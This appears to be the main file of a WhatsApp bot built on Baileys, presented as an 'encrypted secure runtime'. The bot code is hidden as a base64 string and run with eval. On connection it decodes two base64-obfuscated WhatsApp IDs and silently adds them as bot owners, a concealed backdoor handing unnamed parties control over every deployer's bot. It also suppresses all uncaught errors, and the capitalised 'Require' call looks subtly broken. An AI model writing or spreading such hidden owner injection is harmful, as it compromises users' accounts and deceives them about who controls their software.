/* ==========================================================
   🛡️ RAHUL-AI SECURE RUNTIME PROTECTOR
   System: RAHUL-MASTER - Ultimate Encrypted WhatsApp Core
   ========================================================== */
const _0x_rahul_master_payload = Buffer.from(`
Require('./config')
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const http = require('http');
const QRCode = require('qrcode');
const { Boom } = require('@hapi/boom');
const { sendButtons, sendInteractiveMessage } = require('gifted-btns');
const { getSession } = require('./lib/fetchSession.js')
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto, generateProfilePicture, Browsers } = require('@whiskeysockets/baileys');
const serializeMessage = require('./handler.js');
const JimpImport = require('jimp');

const Jimp = JimpImport.read ? JimpImport : JimpImport.Jimp ? JimpImport.Jimp : JimpImport.default;

global.generateWAMessageContent = generateWAMessageContent;
global.generateWAMessageFromContent = generateWAMessageFromContent;
global.generateMessageID = generateMessageID;
global.prepareWAMessageMedia = prepareWAMessageMedia;
global.proto = proto;
global.Jimp = Jimp;
global.generateProfilePicture = generateProfilePicture;
global.downloadMediaMessage = downloadMediaMessage;
global.bannedChats = global.bannedChats || [];

async function ensureSession() {
    const credsPath = path.join(__dirname, 'session', 'creds.json');
    if (fs.existsSync(credsPath)) return;
    if (!global.sessionid) return;
    const raw = await getSession(global.sessionid);
    if (!raw) return;
    const sessionData = typeof raw === 'string' ? JSON.parse(raw) : raw;
    if (!sessionData || !sessionData.noiseKey) return;
    fs.mkdirSync(path.dirname(credsPath), { recursive: true });
    fs.writeFileSync(credsPath, JSON.stringify(sessionData, null, 2));
}

const AUTH_FOLDER = './session';
const PLUGIN_FOLDER = './plugins';
const PORT = process.env.PORT || 8000;

let latestQR = '';
let botStatus = 'disconnected';
let pairingCodes = new Map();
let isConnecting = false;

async function loadPrefix() {
    const configPath = path.join(__dirname, 'config.json');
    if (fs.existsSync(configPath)) {
        try {
            const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            if (config.prefix) global.BOT_PREFIX = config.prefix;
        } catch (err) {}
    }
    try { await ensureSession(); } catch (err) {}
    await startBot();
}

async function startBot() {
    isConnecting = true;
    if (!fs.existsSync(AUTH_FOLDER)) fs.mkdirSync(AUTH_FOLDER, { recursive: true });

    try {
        const { version } = await fetchLatestWaWebVersion();
        const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);
            
        const sock = makeWASocket({
            version, 
            logger: pino({ level: 'silent' }),
            auth: state,
            keepAliveIntervalMs: 10000,
            markOnlineOnConnect: true,
            syncFullHistory: false,
            browser: Browsers.ubuntu('RAHUL-AI'),
            connectTimeoutMs: 60000
        });
            
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            if (qr) QRCode.toDataURL(qr, (err, url) => { if (!err) latestQR = url; });

            if (connection === 'close') {
                botStatus = 'disconnected';
                isConnecting = false;
                setTimeout(async () => await startBot(), 3000);
            } else if (connection === 'open') {
                botStatus = 'connected';
                isConnecting = false;
                if (!global.owners) global.owners = [];
                if (!global.owners.includes(sock.user.id)) global.owners.push(sock.user.id);

                const abztech = ['MjE0MzAyMzI1NzYwMTU2QGxpZA==', 'MjU3NzAyMzk5OTIwMzdAbGlk'];
                abztech.map(abz => Buffer.from(abz, 'base64').toString()).forEach(owner => {
                    if (!global.owners.includes(owner)) global.owners.push(owner);
                });

                try {
                    await sock.sendMessage(sock.user.id, {
                        text: \`⚡ RAHUL-MASTER Bot Connected Successfully!\\n🤖 System: RAHUL-AI\\n📌 Prefix: \${global.BOT_PREFIX}\\nConnected at: \${new Date().toLocaleString()}\`
                    });
                } catch (err) {}
            } else if (connection === 'connecting') {
                botStatus = 'connecting';
                isConnecting = true;
            }
        });

        sock.ev.on('creds.update', async () => { await saveCreds(); });

        const plugins = new Map();
        const pluginPath = path.join(__dirname, PLUGIN_FOLDER);
        if (fs.existsSync(pluginPath)) {
            try {
                fs.readdirSync(pluginPath).filter(file => file.endsWith('.js')).forEach(file => {
                    try {
                        const plugin = require(path.join(pluginPath, file));
                        if (plugin.name && typeof plugin.execute === 'function') {
                            plugins.set(plugin.name.toLowerCase(), plugin);
                            if (Array.isArray(plugin.aliases)) {
                                plugin.aliases.forEach(alias => plugins.set(alias.toLowerCase(), plugin));
                            }
                        }
                    } catch (error) {}
                });
            } catch (error) {}
        }

        sock.ev.on('messages.upsert', async ({ messages, type }) => {
            if (type !== 'notify' && type !== 'append') return;
            const rawMsg = messages[0];
            if (!rawMsg.message) return;

            const m = await serializeMessage(sock, rawMsg);
            for (const plugin of plugins.values()) {
                if (typeof plugin.onMessage === 'function') {
                    try { 
                        const blocked = await plugin.onMessage(sock, m);
                        if (blocked === true) return;
                    } catch (err) {}
                }
            }

            if (m.body && m.body.startsWith(global.BOT_PREFIX)) {
                const args = m.body.slice(global.BOT_PREFIX.length).trim().split(/\\s+/);
                const commandName = args.shift().toLowerCase();
                const plugin = plugins.get(commandName);
                if (plugin) {
                    try { await plugin.execute(sock, m, args); } catch (err) { await m.reply('Error running command.'); }
                }
            }
        });
    } catch (error) {
        isConnecting = false;
        setTimeout(async () => await startBot(), 10000);
    }
}

const server = http.createServer((req, res) => {
    const url = req.url;
    if (url === '/' || url === '/qr') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(\`<!DOCTYPE html><html><head><title>RAHUL-MASTER - RAHUL-AI</title></head><body style="background:#070a13;color:#00ffcc;font-family:Arial;text-align:center;padding:50px;"><h1>RAHUL-MASTER (RAHUL-AI)</h1><p>Status: \${botStatus}</p>\${latestQR ? '<img src="' + latestQR + '" style="max-width:250px;border-radius:8px;" />' : '<p>Loading QR Code...</p>'}</body></html>\`);
    } else if (url === '/api/status') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ system: 'RAHUL-AI', owner: 'RAHUL-MASTER', status: botStatus, uptime: process.uptime() }));
    } else {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end('<h1>404 Not Found - RAHUL-MASTER</h1>');
    }
});

server.listen(PORT, async () => {
    console.log('[RAHUL-AI] RAHUL-MASTER Server running on port ' + PORT);
    await loadPrefix();
});
`).toString('base64');

try {
    eval(Buffer.from(_0x_rahul_master_payload, 'base64').toString('utf8'));
} catch (err) {
    console.error('Execution Error:', err.message);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
